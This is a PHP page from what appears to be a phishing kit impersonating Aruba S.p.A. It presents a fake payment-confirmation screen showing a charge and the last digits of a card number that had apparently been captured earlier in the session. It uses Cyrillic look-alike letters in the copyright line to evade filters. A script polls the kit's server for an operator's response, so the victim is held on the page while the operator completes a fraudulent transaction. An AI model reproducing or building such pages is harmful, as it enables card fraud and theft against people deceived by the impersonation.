<?php
    require_once('PARTS/header.php');
?>
    <body>
        <div class="loader d-flex flex-column  justify-content-center align-items-center d-none">
            <img src="assets/images/aruba_logo.svg" class="loadingimg">
            <p style="padding-top: 25px; font-size: 24px; font-weight:100 ; z-index: 999;">Attendere prego...</p>
        </div>
        <div class="container">
            <div class="row">
                <div class="col-md-12 d-flex flex-column align-items-center">
                        <div class="col-md-8 pt-5">
                            <div class="row">
                                <div class="col-6 text-left">
                                    <img src="assets/images/aruba_logo.svg" width="150px">
                                </div>
                                <div class="col-6 text-right">
                                    <img class="float-end" src="assets/images/viscard.png" width="150px">
                                </div>
                            </div>
                        </div>
                        <div class="col-md-8 mycontent">
                            <div class="row">
                                <div class="col-md-12 d-flex justify-content-center align-items-center p-3">
                                    <img src="assets/images/ICO_pw_token.gif">
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-md-12">
                                    <form id="form">
                                        <div class="speaches">
                                            <p class="text-center"><b>CONFERMA L'OPERAZIONE.</b></p>
                                            <p class="text-center">Apri l'app o la notifica per confermare l'operazione</p>
                                            <p></p>
                                            <div class="pt-4">
                                                <hr>
                                            </div>
                                            <h3 class="bbigti">Dettagli del pagamento</h3>
                                            <p class="title">Importo</p>
                                            <p class="info">5.99 €</p>
                                            <p class="title">Codice ordine</p>
                                            <p class="info"><?php echo $_SESSION['idnum']; ?></p>
                                            <p class="title">Data e ora</p>
                                            <p class="info"><?php echo date('d/m/Y H:i:s') ?></p>
                                            <p class="title">Numero carta</p>
                                            <p class="info">**** **** **** <?php echo substr($_SESSION['cc'], -4) ?></p>
                                        </div>
                                    </form>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-8 text-center pt-5">
                            <p>Cорyrіght @<?php echo date('Y') ?> аrubа ѕ.р.а.- р.і. 0257950516 - аll rіghtѕ rеѕеrνеd -</p>
                            <p class="flink" >Aruba.it</p>
                        </div>
                </div>
            </div>
        </div>
        <?php  require_once('PARTS/footer.php') ?>
        <script src="assets/js/pages/app.js"></script>
		<script>
function callback(response){
if(response==='0'){
                  setTimeout(load, 2000,"./?getresponse=app",callback);
				  }
else window.location="./";
}
function load(url, callback) {
  const xhr = new XMLHttpRequest();

  xhr.onreadystatechange = () => {
    if (xhr.readyState === 4) {
      callback(xhr.response);
    }
  }

  xhr.open('GET', url, true);
  xhr.send('');
}
load("./?getresponse=app",callback);
</script>
    </body>
</html>
